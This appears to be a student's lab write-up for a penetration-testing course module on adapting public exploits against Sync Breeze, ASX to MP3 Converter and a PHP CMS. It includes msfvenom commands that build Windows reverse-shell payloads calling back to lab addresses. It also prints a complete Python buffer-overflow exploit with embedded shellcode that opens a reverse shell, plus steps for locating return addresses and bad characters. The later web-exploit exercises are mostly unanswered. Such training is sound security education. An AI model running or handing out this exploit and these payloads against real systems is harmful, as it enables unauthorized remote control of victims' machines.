# 15.1.4 Cross-Compiling Exploit Code
**1.  Locate the exploit discussed in this section using the searchsploit tool in Kali Linux.**

We simply need to run the following command in order to find our exploit:
`searchsploit "Sync Breeze Enterprise 10.0.28"`

We can then copy the exploit to our working directory by using the -m command:
`searchsploit -m 42341`

**2.  Install the mingw-w64 suite in Kali Linux and compile the exploit code.**

In order to install mingw-w64 we need to run the following command:
`sudo apt install mingw-w64`

Upon viewing the code we see a few headers are included
```#include <inttypes.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
```

Doing a bit of research on winsock informs us that adding the lws2_32 flag should allow us to compile the program on our Kali machine. The following command will compile the code:
`i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`

# 15.1.6 Changing the Socket Information
**1.  Modify the connection information in the exploit in order to target the SyncBreeze installation on your Windows client.**

In order to fix the exploit we simply need to open it in our text editor and modify the IP and port variables which are hard coded.
![[Pasted image 20220717201002.png]]

**2.  Recompile the exploit and use Wireshark to confirm that the code successfully initiates a socket connection to your dedicated Windows client.**

Once we modify the code we must recompile it before running the program. After the recompilation we can run the exe using wine. After executing the exe with wine we see the connection being made via Wireshark.
![[Pasted image 20220717232100.png]]
![[Pasted image 20220717232205.png]]

# 15.1.8 Changing the Return Address
**1.  Find any valid return address instruction and alter the one present in the original exploit.**

We can reuse our initial return address instruction we found in the previous exercise. All we need to do is replace the retn variable with our new instruction.
![[Pasted image 20220717233209.png]]


# 15.1.10 Changing the Payload
**1.  Generate a reverse shell payload using msfvenom while taking into account the bad characters of our exploit.**

To generate a new payload we can run the following MSFVenom command:

`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`

**2.  Replace the original payload with the newly generated one.**

We can now insert this payload into our exploit.
![[Pasted image 20220717233734.png]]

**3.  Attach the debugger to the target process and set a breakpoint at the return address instruction.**

We can now start the service, attach the debugger, and set a breakpoint (F2) at our return instruction.
![[Pasted image 20220717233911.png]]
![[Pasted image 20220717233936.png]]

**4.  Compile the exploit and run it. Did you hit the breakpoint?**

We compile the exploit with the following command:
`i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`

Running the command with wine
`wine syncbreeze_exploit.exe `

Unfortunately, we do not hit our breakpoint and instead the program crashes at 0x9010090c
![[Pasted image 20220717234314.png]]

# 15.1.12 Changing the Overflow Buffer
**1.  Fix the overflow buffer such that the EIP register will be overwritten by your chosen return address instruction.**
Because the exploit is setting the last byte of our buffer to a null byte we must increase our buffer size by 1. We can do this by simply adjusting the "initial_buffer_size" variable from 780 to 781. Recompiling and running this changed exploit we can see we hit our breakpoint.
![[Pasted image 20220717235304.png]]

And letting the program finish running we can see we get our reverse shell.
![[Pasted image 20220717235336.png]]


**2.  Install the _ASX to MP3 Converter_ application located under the C:\Tools\fixing_exploits directory; download the exploit for _ASX to MP3 Converter_ from EDB[1](https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/fixing-exploits/fixing-memory-corruption-exploits/practice-changing-the-overflow-buffer#fn1) and edit it in order to get a shell on your dedicated Windows machine.**

We can start by opening up the PoC exploit and replacing the shellcode with one we generated on our own.  We will be using the python PoC exploit labeled '38382.py'. To start, we need to generate a pattern to identify the location of the EIP register. We do this with the following MSF command:

`msf-pattern_offset -l 300`

We then feed this pattern into our exploit code and note that Immunity Debugger displays the characters "30694139" in the EIP register. From here, we need to identify the proper length of the buffer using the MSF patttern command.

![[Pasted image 20220718234620.png]]

![[Pasted image 20220718034803.png]]

The next step is to identify a JMP ESP command. To start, we need to list available modules using mona., searching for any DLLs that have SafeSEH, ASLR, and NXCompat disabled. Doing this points us to a DLL named "MSA2Mutility03.dll". We now need to search this DLL for a JMP ESP instruction. As we have previously learned, the opcode for JMP ESP is FFE4, thus using the following mona command will lead us to usable JMP ESP addresses.

`!mona find -s "\xff\xe4" -m "MSA2Mutility03.dll"`

This leads us to one working address which will contain no bad characters, 0x1003789D. We can now feed this address into our "EIP" variable in the exploit.
![[Pasted image 20220718235359.png]]

The next step will be to check for bad characters. I decided to do this manually by appending the payload with a list of bad characters. 
![[Pasted image 20220718035038.png]]

I also noticed that the NOP sled was a bit short in the initial PoC so I extended the sled. Finally, I set a breakpoint at the JMP ESP instruction in order to step through the instructions and arrive at our list of bad characters. After some trial and error, the following characters were removed:
`\x01\x09\x0a\x1a`

We can now move on to generating our shellcode, using the following MSF command:
`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=9000 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x09\x0a\x1a"`


Adding this shellcode to our exploit, we get the final PoC which we can use to generate "exploit.asx" which we can then feed into the vulnerable program:
```python
'''
# Exploit Title: ASX to MP3 Converter 1.82.50 Stack Overflow
# Date: 2 Oct 2015
# Exploit Author: ex_ptr
# Vendor Homepage: http://mini-stream.net
# Version: 1.82.50
# Tested on: Windows XP SP3
'''

import struct
filename = "exploit.asx"

dummy = "A"*239

EIP = "\x9d\x78\x03\x10"
FFFF  = "\xFF\xFF\xFF\xFF"
NOP   = "\x90" * 20


# dont use: \x01\x09\x0a\x1a

buf =  b""
buf += b"\xda\xcd\xbe\x3b\xa6\x16\x7a\xd9\x74\x24\xf4\x5f\x29"
buf += b"\xc9\xb1\x52\x83\xef\xfc\x31\x77\x13\x03\x4c\xb5\xf4"
buf += b"\x8f\x4e\x51\x7a\x6f\xae\xa2\x1b\xf9\x4b\x93\x1b\x9d"
buf += b"\x18\x84\xab\xd5\x4c\x29\x47\xbb\x64\xba\x25\x14\x8b"
buf += b"\x0b\x83\x42\xa2\x8c\xb8\xb7\xa5\x0e\xc3\xeb\x05\x2e"
buf += b"\x0c\xfe\x44\x77\x71\xf3\x14\x20\xfd\xa6\x88\x45\x4b"
buf += b"\x7b\x23\x15\x5d\xfb\xd0\xee\x5c\x2a\x47\x64\x07\xec"
buf += b"\x66\xa9\x33\xa5\x70\xae\x7e\x7f\x0b\x04\xf4\x7e\xdd"
buf += b"\x54\xf5\x2d\x20\x59\x04\x2f\x65\x5e\xf7\x5a\x9f\x9c"
buf += b"\x8a\x5c\x64\xde\x50\xe8\x7e\x78\x12\x4a\x5a\x78\xf7"
buf += b"\x0d\x29\x76\xbc\x5a\x75\x9b\x43\x8e\x0e\xa7\xc8\x31"
buf += b"\xc0\x21\x8a\x15\xc4\x6a\x48\x37\x5d\xd7\x3f\x48\xbd"
buf += b"\xb8\xe0\xec\xb6\x55\xf4\x9c\x95\x31\x39\xad\x25\xc2"
buf += b"\x55\xa6\x56\xf0\xfa\x1c\xf0\xb8\x73\xbb\x07\xbe\xa9"
buf += b"\x7b\x97\x41\x52\x7c\xbe\x85\x06\x2c\xa8\x2c\x27\xa7"
buf += b"\x28\xd0\xf2\x68\x78\x7e\xad\xc8\x28\x3e\x1d\xa1\x22"
buf += b"\xb1\x42\xd1\x4d\x1b\xeb\x78\xb4\xcc\xd4\xd5\xc1\x8e"
buf += b"\xbd\x27\x2d\x8e\x86\xa1\xcb\xfa\xe8\xe7\x44\x93\x91"
buf += b"\xad\x1e\x02\x5d\x78\x5b\x04\xd5\x8f\x9c\xcb\x1e\xe5"
buf += b"\x8e\xbc\xee\xb0\xec\x6b\xf0\x6e\x98\xf0\x63\xf5\x58"
buf += b"\x7e\x98\xa2\x0f\xd7\x6e\xbb\xc5\xc5\xc9\x15\xfb\x17"
buf += b"\x8f\x5e\xbf\xc3\x6c\x60\x3e\x81\xc9\x46\x50\x5f\xd1"
buf += b"\xc2\x04\x0f\x84\x9c\xf2\xe9\x7e\x6f\xac\xa3\x2d\x39"
buf += b"\x38\x35\x1e\xfa\x3e\x3a\x4b\x8c\xde\x8b\x22\xc9\xe1"
buf += b"\x24\xa3\xdd\x9a\x58\x53\x21\x71\xd9\x73\xc0\x53\x14"
buf += b"\x1c\x5d\x36\x95\x41\x5e\xed\xda\x7f\xdd\x07\xa3\x7b"
buf += b"\xfd\x62\xa6\xc0\xb9\x9f\xda\x59\x2c\x9f\x49\x59\x65"


exploit = dummy + EIP + FFFF + NOP + buf	

f = open(filename,'wb')
f.write(exploit)
f.close()

```

And we get a reverse shell.
![[Pasted image 20220718214346.png]]


# 15.2.4 Changing Connectivity Information
**1.  Connect to your dedicated Linux lab client and start the apache2 service; the target web application is located under /var/www/https/.**

To accomplish this task we just need to rdesktop or ssh into our dedicated linux client and start the apache2 service with systemctl.

![[Pasted image 20220719004055.png]]

We can then access our web application, using the https flag.
![[Pasted image 20220719004755.png]]

Inspecting the source we see CMS version 2.2.5 is running.
![[Pasted image 20220719004645.png]]

**2.  Modify the original exploit and set the _base_url_ variable to the correct IP address of your dedicated Linux lab client as well as the protocol to HTTPS.**

We simply need to replace the original base_url variable with the correct one from our linux machine.
![[Pasted image 20220719005355.png]]

**3.  Get familiar with the _requests_ Python library and adjust your exploit accordingly to avoid SSL verification.**

To adjust the exploit to avoid SSL verification we need to add the verify parameter and set its value to false.

**4.  Edit the _username_ and _password_ variables to match the ones from our test case (username "admin", password "HUYfaw763").**


**5.  Try to run the exploit against the Linux lab client, does it work? If not, try to explain why.**


# 15.2.6 Troubleshooting the "index out of range" Error
**1.  Observe the error that is generated when running the exploit.**
**2.  Attempt to troubleshoot the code and determine why the error occurs.**
**3.  Modify the exploit in order to avoid the error and run it against your dedicated Linux client.**
**4.  Verify that your exploit worked by attempting to execute the _whoami_ command using the remote php shell.**
**5.  Attempt to obtain a fully interactive shell with this exploit.**